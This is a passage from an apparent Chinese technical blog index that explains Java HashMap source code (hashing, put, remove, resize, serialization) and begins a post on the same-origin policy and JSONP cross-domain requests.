class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里Hash算法本质上就是三步：取key的hashCode值、高位运算、取模运算</p><p>对于任意给定的对象，只要它的hashCode()值相同，那么调用hash()方法中所计算得到的hash码总是相同的。我们首先想到就是把hash值对数组长度求模，这样就保证了元素的分布相对比较均匀。但是，求模运算时间耗费较大，所以采用了indexFor()方法来计算该对象应该保存在table数组中的哪个索引处。</p><p>这个方法非常巧妙，它通过h &amp; (table.length - 1)来得到该对象的保存位，而HashMap底层数组的长度总是2的n次方，这是HashMap在速度上的优化。当length总是2的n次方时，h &amp; (length - 1)运算等价于对length取模，也就是h % length，但是&amp;比%具有更高的效率。</p><p>在JDK1.8的实现中，优化了高位运算的算法，通过hashCode()的高16位异或低16位实现的：(h = k.hashCode()) ^ (h &gt;&gt;&gt; 16)，主要是从速度、功效、质量来考虑的，这么做可以在数组table的length比较小的时候，也能保证考虑到高低Bit都参与到Hash的计算中，同时不会有太大的开销。</p><p>如下图，其中n为table的长度。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-24c0db720e2d499f.png" alt="" /></p><h3 id="添加与修改数据"><a class="markdownIt-Anchor" href="#添加与修改数据"></a> 添加与修改数据</h3><p>由于Java8对hashMap底层进行了优化，当链表长度大于8时，转换为红黑树进行处理，因此以下采用了美团点评技术团队的讲解。</p><p>HashMap的put方法执行过程可以通过下图来理解。</p><p>步骤一：判断键值对数组table[i]是否为空或为null，否则执行resize()进行扩容；</p><p>步骤二：根据键值key计算hash值得到插入的数组索引i，如果table[i]==null，直接新建节点添加，转向⑥，如果table[i]不为空，转向③；</p><p>步骤三：判断table[i]的首个元素是否和key一样，如果相同直接覆盖value，否则转向④，这里的相同指的是hashCode以及equals；</p><p>步骤四：判断table[i] 是否为treeNode，即table[i] 是否是红黑树，如果是红黑树，则直接在树中插入键值对，否则转向⑤；</p><p>步骤五：遍历table[i]，判断链表长度是否大于8，大于8的话把链表转换为红黑树，在红黑树中执行插入操作，否则进行链表的插入操作；遍历过程中若发现key已经存在直接覆盖value即可；</p><p>步骤六：插入成功后，判断实际存在的键值对数量size是否超多了最大容量threshold，如果超过，进行扩容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 对key的hashCode()做hash</span></span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent, <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="comment">// 步骤一：tab为空则创建</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">// 步骤二: 计算index,并对null进行处理 </span></span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">// 步骤三：节点key存在，直接覆盖value</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        <span class="comment">// 步骤四：判断该链为红黑树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="comment">// 步骤五：该链为链表</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">// 链表长度大于8转换为红黑树进行处理</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// key已经存在直接覆盖value</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="comment">// 步骤六：超过最大容量就扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除数据"><a class="markdownIt-Anchor" href="#删除数据"></a> 删除数据</h3><p>下面是Java8中删除数据源代码的分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">remove</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="keyword">return</span> (e = removeNode(hash(key), key, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>)) == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">removeNode</span><span class="params">(<span class="keyword">int</span> hash, Object key, Object value, <span class="keyword">boolean</span> matchValue, <span class="keyword">boolean</span> movable)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, index;</span><br><span class="line">    <span class="comment">// 步骤一：找到要删除数组元素为p</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (p = tab[index = (n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Node&lt;K,V&gt; node = <span class="keyword">null</span>, e; K k; V v;</span><br><span class="line">        <span class="comment">// 步骤二：数组元素p存在，表示要删除的节点node赋为p</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            node = p;</span><br><span class="line">        <span class="comment">// 数组元素p是链表，则将链表的下一个节点赋给节点e</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((e = p.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 步骤三：如果p为红黑树，则调用方法找到要删除的节点赋给node</span></span><br><span class="line">            <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key);</span><br><span class="line">            <span class="comment">// 步骤四：如果为链表，则找到对应要删除的节点赋给node</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key ||</span><br><span class="line">                            (key != <span class="keyword">null</span> &amp;&amp; key.equals(k)))) &#123;</span><br><span class="line">                        node = e;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果找到要删除的节点node</span></span><br><span class="line">        <span class="keyword">if</span> (node != <span class="keyword">null</span> &amp;&amp; (!matchValue || (v = node.value) == value || (value != <span class="keyword">null</span> &amp;&amp; value.equals(v)))) &#123;</span><br><span class="line">            <span class="comment">// 步骤五：判断此时数组元素的类型，并删除对应的节点node</span></span><br><span class="line">            <span class="keyword">if</span> (node <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                ((TreeNode&lt;K,V&gt;)node).removeTreeNode(<span class="keyword">this</span>, tab, movable);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (node == p)</span><br><span class="line">                tab[index] = node.next;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                p.next = node.next;</span><br><span class="line">            ++modCount;</span><br><span class="line">            --size;</span><br><span class="line">            afterNodeRemoval(node);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hashmap的其他相关讲解"><a class="markdownIt-Anchor" href="#hashmap的其他相关讲解"></a> HashMap的其他相关讲解</h2><h3 id="扩容机制"><a class="markdownIt-Anchor" href="#扩容机制"></a> 扩容机制</h3><p>扩容就是重新计算容量，当HashMap中无法容纳更多的元素时，就要扩大数组的长度，以便容纳更多的元素。由于Java中的数组是无法自动扩容的，所以要使用一个新的数组来代替已有的容量小的数组。</p><p>下面我们分析resize()方法的源码，由于Java8引入了红黑树，因此还采用Java7的源码进行分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传入新的容量</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 引用扩容前的Entry数组</span></span><br><span class="line">    Entry[] oldTable = table;</span><br><span class="line">    <span class="keyword">int</span> oldCapacity = oldTable.length;</span><br><span class="line">    <span class="comment">// 扩容前的数组大小如果已经达到最大(2^30)了     </span></span><br><span class="line">    <span class="keyword">if</span> (oldCapacity == MAXIMUM_CAPACITY) &#123;</span><br><span class="line">        <span class="comment">// 修改阈值为int的最大值(2^31-1)，这样以后就不会扩容了</span></span><br><span class="line">        threshold = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化一个新的Entry数组</span></span><br><span class="line">    Entry[] newTable = <span class="keyword">new</span> Entry[newCapacity];</span><br><span class="line">    <span class="comment">// 将数据转移到新的Entry数组里</span></span><br><span class="line">    transfer(newTable);</span><br><span class="line">    <span class="comment">// HashMap的table属性引用新的Entry数组</span></span><br><span class="line">    table = newTable;</span><br><span class="line">    <span class="comment">// 修改阈值</span></span><br><span class="line">    threshold = (<span class="keyword">int</span>)(newCapacity * loadFactor);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将原有Entry数组的元素拷贝到新的Entry数组里</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transfer</span><span class="params">(Entry[] newTable)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// src引用了旧的Entry数组</span></span><br><span class="line">    Entry[] src = table;                </span><br><span class="line">    <span class="keyword">int</span> newCapacity = newTable.length;</span><br><span class="line">    <span class="comment">// 遍历旧的Entry数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; src.length; j++) &#123;</span><br><span class="line">        <span class="comment">// 取得旧Entry数组的每个元素</span></span><br><span class="line">        Entry&lt;K,V&gt; e = src[j];           </span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 释放旧Entry数组的对象引用（for循环后，旧的Entry数组不再引用任何对象）</span></span><br><span class="line">            src[j] = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                Entry&lt;K,V&gt; next = e.next;</span><br><span class="line">                <span class="comment">// 重新计算每个元素在数组中的位置</span></span><br><span class="line">                <span class="keyword">int</span> i = indexFor(e.hash, newCapacity); </span><br><span class="line">                e.next = newTable[i]; <span class="comment">// 标记[1]</span></span><br><span class="line">                newTable[i] = e;      <span class="comment">// 将元素放在数组上</span></span><br><span class="line">                e = next;             <span class="comment">// 访问下一个Entry链上的元素</span></span><br><span class="line">            &#125; <span class="keyword">while</span> (e != <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newTable[i]的引用赋给了e.next，也就是使用了单链表的头插入方式，同一个位置上新元素总会被放在链表的头部位置；这样先放在一个索引的元素最终会放在Entry链的尾部（如果发生了hash冲突），这一点Java8与其不同。由于重新计算了hash值，所以最终可能放在新数组的不同位置。</p><p>下面举个例子简单说明一下扩容的原理。我们采用的hash算法就是key对数组的长度取模。其中哈希桶数组table数组的长度size=2，put的顺序是3、7、5。在mod 2后都在table[1]发生了冲突。这里假设负载因子loadFactor=1，即当键值对实际大小size大于table的实际大小时进行扩容。下面是resize的过程示意图。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-6988e87b562077bb.png" alt="" /></p><p>Java8中对新数组的索引计算采用了更加简洁的算法，不需要每次去计算hash值；而且在旧链表迁移到新链表的时候，如果新表的数组索引位置相同，则链表元素会倒置，而Java8则不会，详细解析可以见<a href="https://tech.meituan.com/java-hashmap.html" target="_blank" rel="noopener">tech.meituan.com/java-hashmap.html</a></p><h3 id="hashmap的table是transient的"><a class="markdownIt-Anchor" href="#hashmap的table是transient的"></a> HashMap的table是transient的</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br></pre></td></tr></table></figure><p><strong>由于table采用了transient修饰，也就是表示其不可以被序列化，它的原因如下：</strong><br />HashMap是基于hashCode的，hashcode作为Object的方法，是native修饰的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>这意味着hashCode与底层相关，对于不同平台的虚拟机，会有不用的hashCode实现方式，也就是同一个对象在不同的平台下会有不同的hashcode值。</p><p>由于Java的跨平台特性，如果table不用transient修饰，在虚拟机A下的程序在虚拟机B下就会造成无法正常运行，这样就失去了其跨平台的意义，所以为了避免这样的情况，Java自己重写了其序列化table的方法，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> buckets = capacity();</span><br><span class="line">    <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    s.writeInt(buckets);</span><br><span class="line">    s.writeInt(size);</span><br><span class="line">    internalWriteEntries(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                            loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</span><br><span class="line">                                            mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                    DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                    (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                    MAXIMUM_CAPACITY :</span><br><span class="line">                    tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><ul><li><a href="http://zhangshixi.iteye.com/blog/672697" target="_blank" rel="noopener">深入Java集合学习系列：HashMap的实现原理</a></li><li><a href="http://www.importnew.com/25049.html" target="_blank" rel="noopener">图解集合 4 ：HashMap</a></li><li><a href="https://tech.meituan.com/java-hashmap.html" target="_blank" rel="noopener">Java 8系列之重新认识HashMap</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 集合 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域请求解决方法——jsonp</title>
      <link href="/CORS-JSONP/"/>
      <url>/CORS-JSONP/</url>
      
        <content type="html"><![CDATA[<p>Javascript出于安全方面的考虑，不允许跨域调用其他页面的对象，但这样却给平时的开发带来了不少麻烦，这里把涉及到跨域的问题进行了简单地整理。</p><h2 id="同源策略"><a class="markdownIt-Anchor" href="#同源策略"></a> 同源策略</h2><h3 id="什么是域origin"><a class="markdownIt-Anchor" href="#什么是域origin"></a> 什么是域（origin）</h3><p>域是由三部分组成：<code>URI Schema</code>（协议类型）、<code>host name</code>（域名）、<code>port number</code>（端口号），举个例子：</p><ul><li><code>http://www.a.com</code>这个页面，<code>URI Schema</code>是http，<code>host name</code>是<code>www.a.com</code>，<code>port number</code>是默认的80；</li><li><code>https://www.b.com:8080/test/</code>这个页面，<code>URI Schema</code>是https，<code>host name</code>是<code>www.b.com</code>，<code>port number</code>是8080。</li></ul><p>上面两个页面的三个部分全部不相同，所以它们就是不同的域。下面表格可以更好地看出什么是同域：</p><table><thead><tr><th>URL</th><th>说明</th><th>是否允许通信</th></tr></thead><tbody><tr><td><code>http://www.a.com/a.js</code><br><code>http://www.a.com/b.js</code></td><td>同一域名下</td><td>允许</td></tr><tr><td><code>http://www.a.com/lab/a.js</code><br><code>http://www.a.com/script/b.js</code></td><td>同一域名下不同文件夹</td><td>允许</td></tr><tr><td><code>http://www.a.com:8000/a.js</code><br><code>http://www.a.com/b.js</code></td><td>同一域名，不同端口</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>https://www.a.com/b.js</code></td><td>同一域名，不同协议</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://70.32.92.74/b.js</code></td><td>域名和域名对应ip</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://script.a.com/b.js</code></td><td>主域相同，子域不同</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://a.com/b.js</code></td><td>同一域名，不同二级域名（同上）</td><td>不允许</td></tr><tr><td><code>http://www.b.com/a.js</code><br><code>http://www.a.com/b.js</code></td><td>不同域名</td><td>不允许</td></tr></tbody></table><h3 id="同源策略-2"><a class="markdownIt-Anchor" href="#同源策略-2"></a> 同源策略</h3><p>它限制了某个域下的文档或者js与另一个域中的资源交互的方式，它提供了一种安全机制，这种安全机制可以避免来自恶意网站的攻击。同源策略要求浏览器允许来自某个网页上的js请求来自另一个网页的数据，当且仅当两个页面来自相同的域。</p><p>通过同源策略可以阻止来自恶意网站的脚本通过其他网站的DOM获取其他网站的信息。可以避免CSRF和XSS攻击。</p><ul><li>同源策略限制的是浏览器或者其他提供类似浏览器服务的软件，这只是一个规范，所以浏览器是否遵守这个规范也不一定，所以IE浏览器判断同源的时候就不必考虑端口号；</li><li>同源策略限制的js，而图片、css这些事不存在同源策略限制的</li></ul><h2 id="jsonp方式的原理"><a class="markdownIt-Anchor" href="#jsonp方式的原理"></a> jsonp方式的原理</h2><ul><li>浏览器的同源策略把跨域请求都禁止了</li><li>HTML的<code>&lt;script&gt;</code>标签是例外，可以突破同源策略从其他来源获取数据</li><li>我们可以通过<code>&lt;script&gt;</code>标签引入jsonp文件，然后通过一系列JS操作获取数据</li></ul><p>实现方法：通过页面中增加一个<code>&lt;script&gt;</code>标签，标签的<code>src</code>指向的是另外一个域的能够提供数据的url，同时将一个本地的<code>callback</code>方法传给服务端，服务端返回的时候将会自动指向<code>callback</code>方法。</p><ol><li><p>通过JS在页面中append如下标签</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"application/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.b.com/test?callback=parseResponse"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>增加该标签之后，浏览器就会立即去请求这个url，由于<code>&lt;script src=&quot;&quot;&gt;</code>方式是不受同源策略限制的，可以避免跨域限制。</p></li><li><p>服务端收到callback参数之后，将它拼接在返回的数据中，返回的数据如下：</p> <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parseResponse(&#123;"name":"hax", "gender":"Male"&#125;);</span><br></pre></td></tr></table></figure></li><li><p>这样返回之后，就调用页面上的<code>parseResponse</code>方法，就达到了数据处理的目的。</p></li><li><p>最后将刚刚新增加到页面中的<code>&lt;script&gt;</code>元素删除。</p></li></ol><h2 id="采用jsonp解决跨域问题"><a 